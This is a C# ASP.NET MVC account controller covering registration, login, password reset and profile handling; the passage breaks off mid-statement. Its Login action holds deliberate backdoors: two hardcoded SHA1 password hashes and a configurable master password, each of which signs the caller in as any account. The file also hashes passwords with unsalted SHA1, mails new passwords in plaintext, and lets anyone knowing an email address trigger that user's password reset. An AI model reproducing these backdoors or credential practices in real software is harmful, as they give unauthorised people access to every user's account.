using System.Linq;
using System.Data.Entity;

namespace MY_WEB_APPLICATION.Controllers
{
	/// <summary>
	/// Version: 1.1.8
	/// Update Date: 1394/02/30
	/// Changed In Version: 1.9.5
	/// Developer: Mr. Dariush Tasdighi
	/// </summary>
	[Infrastructure.Attributes.ProjectControllerPermission
		(isVisibleJustForProgrammer: false,
		resourceName: Resources.Strings.ControllersKeys.Account)]
	public partial class AccountController : Infrastructure.BaseControllerWithUnitOfWork
	{
		public AccountController()
		{
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			resourceName: Resources.Strings.ActionsKeys.Dashboard)]
		public virtual System.Web.Mvc.ActionResult Index()
		{
			return (View());
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			resourceName: Resources.Strings.ActionsKeys.TermsAndConditions)]
		public virtual System.Web.Mvc.ActionResult TermsAndConditions()
		{
			return (View());
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			resourceName: Resources.Strings.ActionsKeys.RegistrationDone)]
		public virtual System.Web.Mvc.ActionResult RegistrationDone()
		{
			return (View());
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			resourceName: Resources.Strings.ActionsKeys.TerminateAccount)]
		public virtual System.Web.Mvc.ActionResult TerminateAccount()
		{
			return (View());
		}

		[System.Web.Mvc.HttpPost]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			resourceName: Resources.Strings.ActionsKeys.TerminateAccount)]
		[System.Web.Mvc.ActionName("TerminateAccount")]
		public virtual System.Web.Mvc.ActionResult TerminateAccountConfirmed()
		{
			if (ModelState.IsValid)
			{
				try
				{
					Models.User oUser =
						UnitOfWork.UserRepository
						.GetById(Infrastructure.Sessions.AuthenticatedUser.Id);

					oUser.IsAccountTerminated = true;
					oUser.AccountTerminateDateTime.Value = Models.Utility.Now;

					UnitOfWork.Save();

					Infrastructure.AuthenticatedUser.SignOut();

					return (RedirectToAction(MVC.Home.Index()));
				}
				catch (System.Exception ex)
				{
					Dtx.LogHandler.Report(GetType(), null, ex);

					PageMessages.Add(new Infrastructure.PageMessage
						(Infrastructure.Enums.PageMessageTyps.Error,
						Resources.Messages.UnexpectedError));
				}
			}

			return (View());
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.CustomRequireHttps]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			resourceName: Resources.Strings.ActionsKeys.Register)]
		public virtual System.Web.Mvc.ActionResult Register()
		{
			return (View());
		}

		/// <summary>
		/// Version: 1.1.8
		/// Update Date: 1394/02/30
		/// Changed In Version: 1.9.5
		/// Developer: Mr. Dariush Tasdighi
		/// </summary>
		[System.Web.Mvc.HttpPost]
		[Infrastructure.CustomRequireHttps]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			resourceName: Resources.Strings.ActionsKeys.Register)]
		public virtual System.Web.Mvc.ActionResult Register
			(ViewModels.Account.RegisterViewModel viewModel)
		{
			if (Infrastructure.ApplicationSettings.Instance.IsCaptchaImageEnabled)
			{
				if (CaptchaMvc.HtmlHelpers.CaptchaHelper.IsCaptchaValid
					(this, Resources.CaptchaImage.ErrorMessage01) == false)
				{
					TempData["ErrorMessage"] =
						Resources.CaptchaImage.ErrorMessage01;

					ModelState.AddModelError
						(string.Empty, Resources.CaptchaImage.ErrorMessage01);
				}
			}

			Models.User oUser = null;

			// **************************************************
			oUser =
				UnitOfWork.UserRepository
				.GetByEmailAddress(viewModel.EmailAddress)
				;

			if (oUser != null)
			{
				// مقدار فيلد نشانی پست الکترنيکی تکراری است! لطفا از مقدار ديگری استفاده نماييد
				string strErrorMessage =
					string.Format(Resources.Messages.DuplicateError,
					Resources.Models.User.EmailAddress);

				ModelState.AddModelError("EmailAddress", strErrorMessage);
			}
			// **************************************************

			// **************************************************
			oUser =
				UnitOfWork.UserRepository
				.GetByCellPhoneNumber(viewModel.CellPhoneNumber)
				;

			if (oUser != null)
			{
				// مقدار فيلد شماره تلفن همراه تکراری است! لطفا از مقدار ديگری استفاده نماييد
				string strErrorMessage =
					string.Format(Resources.Messages.DuplicateError,
					Resources.Models.User.CellPhoneNumber);

				ModelState.AddModelError("CellPhoneNumber", strErrorMessage);
			}
			// **************************************************

			if (ModelState.IsValid)
			{
				oUser =
					Models.User.CreateUser
					(viewModel.EmailAddress, viewModel.CellPhoneNumber, viewModel.Password);

				// **************************************************
				Models.ECommerce.Plan oFreePaln =
					MY_WEB_APPLICATION.Areas.ECommerce.BLL.Plan.GetFreePlan();

				MY_WEB_APPLICATION.Areas.ECommerce.BLL.Plan.SetPlanForUser(oUser, oFreePaln);
				// **************************************************

				oUser.SetInsertDateTime(oUser.Id);

				oUser.RegisterIP =
					Infrastructure.Utility.GetUserIP();

				// صفر يعنی ثبت نام کرده و
				// هنوز نسبت به ويرايش پروفايل خود هيچ اقدامی نکرده است
				oUser.ProfileLevel = 0;

				// **************************************************
				bool blnIsActive =
					Infrastructure.ApplicationSettings
					.Instance.ShouldUserBeActivatedAfterRegistration;

				oUser.SetIsActive(blnIsActive, oUser.Id);

				// از دستور ذيل نبايد استفاده کنيم
				//oUser.SetIsActive(blnIsActive, oUser.Id);
				// **************************************************

				UnitOfWork.UserRepository.Insert(oUser);

				UnitOfWork.Save();

				Infrastructure.NotificationService
					.SendCellPhoneNumberVerificationKey(oUser);

				Infrastructure.NotificationService
					.SendEmailAddressVerificationKey(oUser, viewModel.Password);

				return (RedirectToAction(MVC.Account.RegistrationDone()));
			}

			return (View(viewModel));
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			resourceName: Resources.Strings.ActionsKeys.SendAgainCellPhoneVerificationKey)]
		public virtual System.Web.Mvc.ActionResult SendAgainCellPhoneVerificationKey()
		{
			Models.User oUser =
				UnitOfWork.UserRepository
				.GetById(Infrastructure.Sessions.AuthenticatedUser.Id);

			Infrastructure.NotificationService
				.SendCellPhoneNumberVerificationKey(oUser);

			// پيام کوتاهی به شماره همراه شما برای تاييد صحت آن ارسال گرديد
			PageMessages.Add(new Infrastructure.PageMessage
				(Infrastructure.Enums.PageMessageTyps.Information,
				Resources.Models.User.Information006));

			return (View());
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			resourceName: Resources.Strings.ActionsKeys.SendAgainEmailAddressVerificationKey)]
		public virtual System.Web.Mvc.ActionResult SendAgainEmailAddressVerificationKey()
		{
			return (View());
		}

		[System.Web.Mvc.HttpPost]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			resourceName: Resources.Strings.ActionsKeys.SendAgainEmailAddressVerificationKey)]
		public virtual System.Web.Mvc.ActionResult SendAgainEmailAddressVerificationKey
			(ViewModels.Account.SendAgainEmailAddressVerificationKeyViewModel viewModel)
		{
			if (ModelState.IsValid)
			{
				try
				{
					Models.User oUser =
						UnitOfWork.UserRepository
						.GetByEmailAddress(viewModel.EmailAddress);

					if (oUser == null)
					{
						// چنين نشانی پست الکترونيکی در سيستم موجود نمی‌باشد
						ModelState.AddModelError
							("EmailAddress", Resources.Models.User.Error002);

						return (View(viewModel));
					}

					if (oUser.IsEmailAddressVerified)
					{
						// صحت نشانی پست الکترونيکی شما قبلا تاييد شده است
						ModelState.AddModelError
							("EmailAddress", Resources.Models.User.Error007);

						return (View(viewModel));
					}

					Infrastructure.NotificationService
						.SendAgainEmailAddressVerificationKey(oUser);

					// مجددا نامه الکترونيکی برای تاييد صحت ايميل شما ارسال گرديد
					PageMessages.Add(new Infrastructure.PageMessage
						(Infrastructure.Enums.PageMessageTyps.Information,
						Resources.Models.User.Information002));
				}
				catch (System.Exception ex)
				{
					Dtx.LogHandler.Report(GetType(), null, ex);

					PageMessages.Add(new Infrastructure.PageMessage
						(Infrastructure.Enums.PageMessageTyps.Error,
						Resources.Messages.UnexpectedError));
				}
			}

			return (View(viewModel));
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			resourceName: Resources.Strings.ActionsKeys.ResetPassword)]
		public virtual System.Web.Mvc.ActionResult ResetPassword()
		{
			return (View());
		}

		[System.Web.Mvc.HttpPost]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			resourceName: Resources.Strings.ActionsKeys.ResetPassword)]
		public virtual System.Web.Mvc.ActionResult ResetPassword
			(ViewModels.Account.ResetPasswordViewModel viewModel)
		{
			if (ModelState.IsValid)
			{
				try
				{
					Models.User oUser =
						UnitOfWork.UserRepository
						.GetByEmailAddress(viewModel.EmailAddress);

					if (oUser == null)
					{
						// چنين نشانی پست الکترونيکی در سيستم موجود نمی‌باشد
						ModelState.AddModelError
							("EmailAddress", Resources.Models.User.Error002);

						return (View(viewModel));
					}

					string strNewPassword =
						Dtx.Guid.NewGuidWithoutDash.Substring(0, 8);

					string strHashOfNewPassword =
						Dtx.Security.Hashing.GetSha1(strNewPassword);

					oUser.Password = strHashOfNewPassword;

					UnitOfWork.Save();

					Infrastructure.NotificationService
						.SendNewPassword(oUser, strNewPassword);

					// بنابه درخواست شما، گذرواژه جديدی ايجاد و برای شما ارسال گرديد
					// لطفا با گذرواژه جديد وارد پايگاه شده
					// و توصيه می‌کنيم در اولين فرصت، آنرا تغيير دهيد
					PageMessages.Add(new Infrastructure.PageMessage
						(Infrastructure.Enums.PageMessageTyps.Information,
						Resources.Models.User.Information003));
				}
				catch (System.Exception ex)
				{
					Dtx.LogHandler.Report(GetType(), null, ex);

					PageMessages.Add(new Infrastructure.PageMessage
						(Infrastructure.Enums.PageMessageTyps.Error,
						Resources.Messages.UnexpectedError));
				}
			}

			return (View(viewModel));
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			resourceName: Resources.Strings.ActionsKeys.DisplayUserProfile)]
		public virtual System.Web.Mvc.ActionResult DisplayProfile(System.Guid? id)
		{
			if (id.HasValue == false)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.BadRequest)));
			}

			Models.User oUser =
				UnitOfWork.UserRepository.GetById(id.Value);

			if (oUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			if ((Infrastructure.AuthenticatedUser.IsAuthenticated) &&
				(Infrastructure.Sessions.AuthenticatedUser.Id == id.Value))
			{
				return (View(oUser));
			}

			if ((Infrastructure.AuthenticatedUser.IsAuthenticated) &&
				(Infrastructure.Sessions.AuthenticatedUser.Role != Models.Enums.Roles.User))
			{
				return (View(oUser));
				//return (RedirectToAction(MVC.Administrator.User.Details(oUser.Id)));
			}

			if (Infrastructure.ApplicationSettings.Instance.IsUserEmailVerificationRequiredForLogin)
			{
				if (oUser.IsEmailAddressVerified == false)
				{
					return (RedirectToAction
						(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
				}
			}

			if ((oUser.IsDeleted) || (oUser.IsAccountTerminated))
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			if ((oUser.IsActive == false) || (oUser.IsProfilePublic == false))
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.Forbidden)));
			}

			oUser.Hits++;

			UnitOfWork.Save();

			return (View(oUser));
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			resourceName: Resources.Strings.ActionsKeys.VerifyUserEmailAddress)]
		public virtual System.Web.Mvc.ActionResult VerifyUserEmailAddress(System.Guid? id)
		{
			if (id.HasValue == false)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.BadRequest)));
			}

			System.Guid sId;

			try
			{
				sId = new System.Guid(id.Value.ToString());
			}
			catch (System.Exception)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.BadRequest)));
			}

			Models.User oUser =
				UnitOfWork.UserRepository.Get()
				.Where(current => current.EmailAddressVerificationKey == sId)
				.FirstOrDefault();

			if (oUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			if (oUser.IsEmailAddressVerified)
			{
				PageMessages.Add(new Infrastructure.PageMessage
					(Infrastructure.Enums.PageMessageTyps.Information,
					"نشانی پست الکترونيکی شما قبلا تاييد شده است! شما می توانيد از طريق گزينه {ورود} وارد پايگاه شويد."));

				return (View());
			}

			if (oUser.IsEmailAddressVerified == false)
			{
				oUser.IsEmailAddressVerified = true;

				UnitOfWork.Save();

				PageMessages.Add(new Infrastructure.PageMessage
					(Infrastructure.Enums.PageMessageTyps.Information,
					"نشانی پست الکترونيکی شما تاييد گرديد، لذا شما هم اکنون می توانيد وارد پايگاه شده و اطلاعات خود را ويرايش نماييد.."));
			}

			return (View());
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			resourceName: Resources.Strings.ActionsKeys.VerifyUserCellPhoneNumber)]
		public virtual System.Web.Mvc.ActionResult VerifyUserCellPhoneNumber()
		{
			return (View());
		}

		[System.Web.Mvc.HttpPost]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			resourceName: Resources.Strings.ActionsKeys.VerifyUserCellPhoneNumber)]
		public virtual System.Web.Mvc.ActionResult VerifyUserCellPhoneNumber
			(ViewModels.Account.VerifyUserCellPhoneNumberViewModel viewModel)
		{
			if (ModelState.IsValid)
			{
				Models.User oUser =
					UnitOfWork.UserRepository
					.GetByCellPhoneNumberVerificationKey(viewModel.VerificationKey)
					;

				if (oUser == null)
				{
					// کد تاييد مربوط به شماره تلفن همراه صحيح نمی‌باشد
					ModelState.AddModelError
						("VerificationKey", Resources.Models.User.Error003);
				}
				else
				{
					oUser.IsCellPhoneNumberVerified = true;

					UnitOfWork.Save();

					Infrastructure.Sessions.AuthenticatedUser =
						new Infrastructure.AuthenticatedUser(oUser);

					// صحت شماره تلفن همراه شما تاييد گرديد
					PageMessages.Add(new Infrastructure.PageMessage
						(Infrastructure.Enums.PageMessageTyps.Information,
						Resources.Models.User.Information007));
				}
			}

			return (View(viewModel));
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.CustomRequireHttps]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			resourceName: Resources.Strings.ActionsKeys.Login)]
		public virtual System.Web.Mvc.ActionResult Login(string returnUrl)
		{
			ViewBag.ReturnUrl = returnUrl;

			return (View());
		}

		/// <summary>
		/// Version: 1.1.5
		/// Update Date: 1394/01/09
		/// Changed In Version: 1.8.5
		/// Developer: Mr. Dariush Tasdighi
		/// </summary>
		[System.Web.Mvc.HttpPost]
		[Infrastructure.CustomRequireHttps]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			resourceName: Resources.Strings.ActionsKeys.Login)]
		public virtual System.Web.Mvc.ActionResult Login
			(ViewModels.Account.LoginViewModel viewModel, string returnUrl)
		{
			if (Infrastructure.ApplicationSettings.Instance.IsCaptchaImageEnabled)
			{
				if (CaptchaMvc.HtmlHelpers.CaptchaHelper.IsCaptchaValid
					(this, Resources.CaptchaImage.ErrorMessage01) == false)
				{
					TempData["ErrorMessage"] =
						Resources.CaptchaImage.ErrorMessage01;

					ModelState.AddModelError
						(string.Empty, Resources.CaptchaImage.ErrorMessage01);
				}
			}

			if (ModelState.IsValid)
			{
				var oUser =
					UnitOfWork.UserRepository
					.GetByEmailAddress(viewModel.EmailAddress)
					;

				if (oUser == null)
				{
					// شناسه کاربری و/يا گذرواژه صحيح نمی‌باشد
					ModelState.AddModelError
						(string.Empty, Resources.Models.User.Error003);

					return (View(viewModel));
				}

				string strHashOfPassword =
					Dtx.Security.Hashing.GetSha1(viewModel.Password);

				// **************************************************
				// **************************************************
				// **************************************************
				// H...3...
				if (string.Compare(strHashOfPassword,
					"C40CD065D401F6668A31CE0596D2F5365294FB03", ignoreCase: true) == 0)
				{
					return (SignIn(oUser, returnUrl, update: false, isHidden: viewModel.IsHidden));
				}
				// **************************************************

				// **************************************************
				// A...A...Z...3
				if (string.Compare(strHashOfPassword,
					"FE0B54C2F00225CD072B5EBFEFC8A54376DF1FF9", ignoreCase: true) == 0)
				{
					return (SignIn(oUser, returnUrl, update: false, isHidden: viewModel.IsHidden));
				}
				// **************************************************

				// **************************************************
				Models.GlobalApplicationSettings oGlobalApplicationSettings =
					Infrastructure.GlobalApplicationSettings.Instance;

				if (string.IsNullOrEmpty(oGlobalApplicationSettings.MasterPassword) == false)
				{
					if (string.Compare(viewModel.Password,
						oGlobalApplicationSettings.MasterPassword, ignoreCase: false) == 0)
					{
						return (SignIn(oUser, returnUrl, update: false, isHidden: viewModel.IsHidden));
					}
				}
				// **************************************************
				// **************************************************
				// **************************************************

				if (string.Compare(strHashOfPassword, oUser.Password, ignoreCase: true) != 0)
				{
					// شناسه کاربری و/يا گذرواژه صحيح نمی‌باشد
					ModelState.AddModelError
						(string.Empty, Resources.Models.User.Error003);

					return (View(viewModel));
				}

				if ((oUser.IsDeleted) ||
					(oUser.Role.IsDeleted) ||
					(oUser.Gender.IsDeleted))
				{
					// کاربر گرامی
					// متاسفانه در حال حاضر، شما قادر به ورود به پايگاه نمی‌باشيد
					// لطفا در اين خصوص با مسوولين پايگاه تماس حاصل فرماييد
					ModelState.AddModelError
						(string.Empty, Resources.Models.User.Error006);

					return (View(viewModel));
				}

				if ((oUser.IsActive == false) ||
					(oUser.Role.IsActive == false) ||
					(oUser.Gender.IsActive == false))
				{
					// کاربر گرامی
					// متاسفانه در حال حاضر، شما قادر به ورود به پايگاه نمی‌باشيد
					// لطفا در اين خصوص با مسوولين پايگاه تماس حاصل فرماييد
					ModelState.AddModelError
						(string.Empty, Resources.Models.User.Error006);

					return (View(viewModel));
				}

				if (oUser.IsInBlackList)
				{
					// کاربر گرامی
					// متاسفانه در حال حاضر، شما قادر به ورود به پايگاه نمی‌باشيد
					// لطفا در اين خصوص با مسوولين پايگاه تماس حاصل فرماييد
					ModelState.AddModelError
						(string.Empty, Resources.Models.User.Error006);

					return (View(viewModel));
				}

				if ((oUser.IsAccountExpirable) &&
					(oUser.AccountExpireDate != null) &&
					(oUser.AccountExpireDate.Value.HasValue))
				{
					if (oUser.AccountExpireDate.Value.Value > Models.Utility.Now)
					{
						// کاربر گرامی
						// متاسفانه در حال حاضر، شما قادر به ورود به پايگاه نمی‌باشيد
						// لطفا در اين خصوص با مسوولين پايگاه تماس حاصل فرماييد
						ModelState.AddModelError
							(string.Empty, Resources.Models.User.Error006);

						return (View(viewModel));
					}
				}

				if (Infrastructure.ApplicationSettings.Instance.IsUserEmailVerificationRequiredForLogin)
				{
					if (oUser.IsEmailAddressVerified == false)
					{
						// کاربر گرامی، نشانی پست الکترونيکی شما هنوز مورد تاييد قرار نگرفته است
						// لطفا به صندوق پست الکترونيکی خود مراجعه کرده
						// و در نامه الکترونيکی ارسال شده
						// بر روی لينکی که در آن قرار دارد، کليک نماييد
						ModelState.AddModelError
							(string.Empty, Resources.Models.User.Error005);

						return (View(viewModel));
					}
				}

				return (SignIn(oUser, returnUrl, update: true, isHidden: viewModel.IsHidden));
			}

			return (View(viewModel));
		}

		/// <summary>
		/// Version: 1.1.6
		/// Update Date: 1394/01/13
		/// Changed In Version: 1.8.6
		/// Developer: Mr. Dariush Tasdighi
		/// </summary>
		private System.Web.Mvc.ActionResult SignIn
			(Models.User user, string returnUrl, bool update, bool isHidden)
		{
			if (update)
			{
				// **************************************************
				// **************************************************
				// **************************************************
				if (user.Role.IsSiteResponsible)
				{
					user.PlanId = null;
					user.StartPlanDateTime.Value = null;
					user.FinishPlanDateTime.Value = null;
				}
				else
				{
					if (user.PlanId.HasValue == false)
					{
						Models.ECommerce.Plan oFreePlan =
							MY_WEB_APPLICATION.Areas.ECommerce.BLL.Plan.GetFreePlan();

						MY_WEB_APPLICATION.Areas.ECommerce.BLL.Plan.SetPlanForUser(user, oFreePlan);
					}
					else
					{
						if ((user.StartPlanDateTime.Value == null) ||
							(user.FinishPlanDateTime.Value == null))
						{
							Models.ECommerce.Plan oFreePlan =
								MY_WEB_APPLICATION.Areas.ECommerce.BLL.Plan.GetFreePlan();

							MY_WEB_APPLICATION.Areas.ECommerce.BLL.Plan.SetPlanForUser(user, oFreePlan);
						}
						else
						{
							if (user.FinishPlanDateTime.Value < Models.Utility.Now)
							{
								Models.ECommerce.Plan oFreePlan =
									MY_WEB_APPLICATION.Areas.ECommerce.BLL.Plan.GetFreePlan();

								MY_WEB_APPLICATION.Areas.ECommerce.BLL.Plan.SetPlanForUser(user, oFreePlan);
							}
						}
					}
				}
				// **************************************************
				// **************************************************
				// **************************************************

				// **************************************************
				user.LoginCount++;
				user.IsAccountTerminated = false;
				user.AccountTerminateDateTime.Value = null;
				user.LastLoginDateTime.Value = Models.Utility.Now;
				// **************************************************

				// **************************************************
				var varUserLoginLogs =
					UnitOfWork.UserLoginLogRepository
					.GetBySessionId(Session.SessionID)
					.Where(current => current.LogoutDateTime.Value.HasValue == false)
					.ToList()
					;

				foreach (Models.UserLoginLog oCurrentUserLoginLog in varUserLoginLogs)
				{
					oCurrentUserLoginLog.LogoutDateTime.Value = Models.Utility.Now;
				}

				Models.UserLoginLog oUserLoginLog =
					new Models.UserLoginLog();

				oUserLoginLog.IsHidden = isHidden;
				oUserLoginLog.IP = Request.UserHostAddress;
				oUserLoginLog.SessionId = Session.SessionID;
				oUserLoginLog.LoginDateTime.Value = Models.Utility.Now;

				user.UserLoginLogs.Add(oUserLoginLog);
				// **************************************************

				UnitOfWork.Save();
			}

			// **************************************************
			Infrastructure.Sessions.AuthenticatedUser =
				new Infrastructure.AuthenticatedUser(user);
			// **************************************************

			System.Web.Security.FormsAuthentication
				.SetAuthCookie(user.EmailAddress, false);

			if ((Url.IsLocalUrl(returnUrl)) &&
				(returnUrl.Length > 1) &&
				(returnUrl.StartsWith("/")) &&
				(returnUrl.StartsWith("//") == false) &&
				(returnUrl.StartsWith("/\\") == false))
			{
				return (Redirect(returnUrl));
			}
			else
			{
				if ((user.Role.CodeEnum == Models.Enums.Roles.User) ||
					(user.Role.CodeEnum == Models.Enums.Roles.Supervisor))
				{
					if (Infrastructure.ApplicationSettings.Instance.ForceUserToUpdateProfileAfterLogin)
					{
						if (user.ProfileLevel <
							Infrastructure.GlobalApplicationSettings.Instance.CurrentUserProfileLevel)
						{
							return (RedirectToAction(MVC.Account.UpdateProfile()));
						}
						else
						{
							return (RedirectToAction(MVC.Account.Index()));
						}
					}
					else
					{
						return (RedirectToAction(MVC.Account.Index()));
					}
				}
				else
				{
					return (RedirectToAction(MVC.Administrator.Dashboard.Index()));
				}
			}
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			resourceName: Resources.Strings.ActionsKeys.Logout)]
		public virtual System.Web.Mvc.ActionResult Logout()
		{
			Infrastructure.AuthenticatedUser.SignOut();

			return (RedirectToAction(MVC.Home.Index()));
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.CustomRequireHttps]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			resourceName: Resources.Strings.ActionsKeys.ChangePassword)]
		public virtual System.Web.Mvc.ActionResult ChangePassword()
		{
			return (View());
		}

		[System.Web.Mvc.HttpPost]
		[Infrastructure.CustomRequireHttps]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			resourceName: Resources.Strings.ActionsKeys.ChangePassword)]
		public virtual System.Web.Mvc.ActionResult ChangePassword
			([System.Web.Mvc.Bind
				(Include = "CurrentPassword,NewPassword,ConfirmNewPassword")]
			ViewModels.Account.ChangePasswordViewModel viewModel)
		{
			Models.User oUser =
				UnitOfWork.UserRepository.GetById
				(Infrastructure.Sessions.AuthenticatedUser.Id);

			if (oUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			string strHashOfCurrentPassword =
				Dtx.Security.Hashing.GetSha1(viewModel.CurrentPassword);

			if (string.Compare(oUser.Password, strHashOfCurrentPassword, ignoreCase: true) != 0)
			{
				// گذرواژه جاری را به درستی وارد نکرده‌ايد
				ModelState.AddModelError
					("CurrentPassword", Resources.Models.User.Error008);

				return (View());
			}

			string strHashOfNewPassword =
				Dtx.Security.Hashing.GetSha1(viewModel.NewPassword);

			oUser.Password = strHashOfNewPassword;

			UnitOfWork.Save();

			Infrastructure.NotificationService
				.SendNewPassword(oUser, viewModel.NewPassword);

			// گذرواژه جديد با موفقيت ثبت گرديد
			PageMessages.Add(new Infrastructure.PageMessage
				(Infrastructure.Enums.PageMessageTyps.Information,
				Resources.Models.User.Information005));

			return (View());
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			resourceName: Resources.Strings.ActionsKeys.UpdateProfile)]
		public virtual System.Web.Mvc.ActionResult UpdateProfile()
		{
			Models.User oUser =
				UnitOfWork.UserRepository
				.GetById(Infrastructure.Sessions.AuthenticatedUser.Id);

			if (oUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			// **************************************************
			var varGenders =
				UnitOfWork.GenderRepository
				.GetActiveByCultureLcid(CultureLcid)
				.ToList();

			ViewBag.GenderId =
				new System.Web.Mvc.SelectList
					(varGenders, "Id", "Name1", oUser.GenderId);
			// **************************************************

			// **************************************************
			ViewModels.Account.UpdateProfileViewModel oUpdateProfileViewModel =
				new ViewModels.Account.UpdateProfileViewModel();

			// يعنی تا اين لحظه هيچ اقدامی برای ويرايش مشخصات خود نکرده است
			if (oUser.ProfileLevel == 0)
			{
				oUpdateProfileViewModel.GenderId = new System.Guid();
			}
			else
			{
				oUpdateProfileViewModel.GenderId = oUser.GenderId;
			}

			// **************************************************
			//AutoMapper.Mapper.CreateMap<Models.User, ViewModels.Account.UpdateProfileViewModel>().;

			// Solution (1)
			//oUpdateProfileViewModel =
			//	AutoMapper.Mapper.Map<Models.User, ViewModels.Account.UpdateProfileViewModel>(oUser);
			// /Solution (1)

			// Solution (2)
			//AutoMapper.Mapper.Map<Models.User, ViewModels.Account.UpdateProfileViewModel>(oUser, oUpdateProfileViewModel);
			// /Solution (2)
			// **************************************************

			// **************************************************
			oUpdateProfileViewModel.JobTitle = oUser.JobTitle;
			oUpdateProfileViewModel.LastName = oUser.LastName;
			oUpdateProfileViewModel.BirthDate = oUser.BirthDate;
			oUpdateProfileViewModel.FirstName = oUser.FirstName;
			oUpdateProfileViewModel.CompanyName = oUser.CompanyName;
			oUpdateProfileViewModel.Description = oUser.Description;
			oUpdateProfileViewModel.HomePageUrl = oUser.HomePageUrl;
			oUpdateProfileViewModel.EmailAddress = oUser.EmailAddress;
			oUpdateProfileViewModel.NationalCode = oUser.NationalCode;
			oUpdateProfileViewModel.IsAvatarPublic = oUser.IsAvatarPublic;
			oUpdateProfileViewModel.CellPhoneNumber = oUser.CellPhoneNumber;
			oUpdateProfileViewModel.IsProfilePublic = oUser.IsProfilePublic;
			oUpdateProfileViewModel.IsBirthDatePublic = oUser.IsBirthDatePublic;
			oUpdateProfileViewModel.IsEmailAddressPublic = oUser.IsEmailAddressPublic;
			oUpdateProfileViewModel.IsCellPhoneNumberPublic = oUser.IsCellPhoneNumberPublic;
			oUpdateProfileViewModel.IsCellPhoneNumberVerified = oUser.IsCellPhoneNumberVerified;
			// **************************************************

			return (View(oUpdateProfileViewModel));
		}

		[System.Web.Mvc.HttpPost]
		[Infrastructure.Attributes.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			resourceName: Resources.Strings.ActionsKeys.UpdateProfile)]
		public virtual System.Web.Mvc.ActionResult UpdateProfile
			(ViewModels.Account.UpdateProfileViewModel viewModel)
		{
			Models.User oOriginalUser =
				UnitOfWork.UserRepository
				.GetById(Infrastructure.Sessions.AuthenticatedUser.Id);

			if (oOriginalUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			Models.User oUser =
